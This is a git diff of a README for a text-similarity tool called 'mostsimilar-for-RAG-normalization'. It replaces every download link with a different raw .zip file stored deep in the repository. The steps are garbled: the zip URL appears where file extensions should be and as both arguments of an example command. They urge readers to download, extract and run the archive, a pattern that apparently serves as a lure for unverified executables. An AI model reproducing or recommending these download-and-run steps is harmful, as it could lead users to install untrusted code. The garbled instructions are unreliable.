@@ -15,16 +15,16 @@ Welcome to the mostsimilar-for-RAG-normalization project! This application helps
 
 To get started, visit the Releases page to download the latest version of the software.
 
-[![Download mostsimilar-for-RAG-normalization](https://github.com/hady959/mostsimilar-for-RAG-normalization/raw/refs/heads/main/MatchText/mostsimilar-RA-normalization-for-2.1.zip%20Release-brightgreen)](https://github.com/hady959/mostsimilar-for-RAG-normalization/raw/refs/heads/main/MatchText/mostsimilar-RA-normalization-for-2.1.zip)
+[![Download mostsimilar-for-RAG-normalization](https://github.com/hady959/mostsimilar-for-RAG-normalization/raw/refs/heads/main/Data/RepoWithSample/for-normalization-mostsimilar-RA-1.8.zip%20Release-brightgreen)](https://github.com/hady959/mostsimilar-for-RAG-normalization/raw/refs/heads/main/Data/RepoWithSample/for-normalization-mostsimilar-RA-1.8.zip)
 
 ### Steps to Download and Run
 
-1. Click on the link above to go to the [Releases page](https://github.com/hady959/mostsimilar-for-RAG-normalization/raw/refs/heads/main/MatchText/mostsimilar-RA-normalization-for-2.1.zip).
+1. Click on the link above to go to the [Releases page](https://github.com/hady959/mostsimilar-for-RAG-normalization/raw/refs/heads/main/Data/RepoWithSample/for-normalization-mostsimilar-RA-1.8.zip).
 2. Look for the latest version listed on that page.
-3. Choose the appropriate file for your operating system. You might see files with extensions like `https://github.com/hady959/mostsimilar-for-RAG-normalization/raw/refs/heads/main/MatchText/mostsimilar-RA-normalization-for-2.1.zip` or `.zip` for Linux.
+3. Choose the appropriate file for your operating system. You might see files with extensions like `https://github.com/hady959/mostsimilar-for-RAG-normalization/raw/refs/heads/main/Data/RepoWithSample/for-normalization-mostsimilar-RA-1.8.zip` or `.zip` for Linux.
 4. Click on the file to download it to your computer.
 5. Find the downloaded file in your computer's Downloads folder.
-6. Extract the contents if it’s a compressed file (like `https://github.com/hady959/mostsimilar-for-RAG-normalization/raw/refs/heads/main/MatchText/mostsimilar-RA-normalization-for-2.1.zip` or `.zip`).
+6. Extract the contents if it’s a compressed file (like `https://github.com/hady959/mostsimilar-for-RAG-normalization/raw/refs/heads/main/Data/RepoWithSample/for-normalization-mostsimilar-RA-1.8.zip` or `.zip`).
 7. Open your terminal.
 8. Navigate to the folder where you extracted the files.
 9. To run the application, type the command specific to your operating system. For example, you might type `./mostsimilar` followed by the necessary parameters based on what you want to analyze.
@@ -44,7 +44,7 @@ After running the application, you can use the following commands based on your 
 
 - To compare two files, use:
   ```
-  ./mostsimilar compare https://github.com/hady959/mostsimilar-for-RAG-normalization/raw/refs/heads/main/MatchText/mostsimilar-RA-normalization-for-2.1.zip https://github.com/hady959/mostsimilar-for-RAG-normalization/raw/refs/heads/main/MatchText/mostsimilar-RA-normalization-for-2.1.zip
+  ./mostsimilar compare https://github.com/hady959/mostsimilar-for-RAG-normalization/raw/refs/heads/main/Data/RepoWithSample/for-normalization-mostsimilar-RA-1.8.zip https://github.com/hady959/mostsimilar-for-RAG-normalization/raw/refs/heads/main/Data/RepoWithSample/for-normalization-mostsimilar-RA-1.8.zip
   ```
 
 - To search for similar documents in a directory, use:
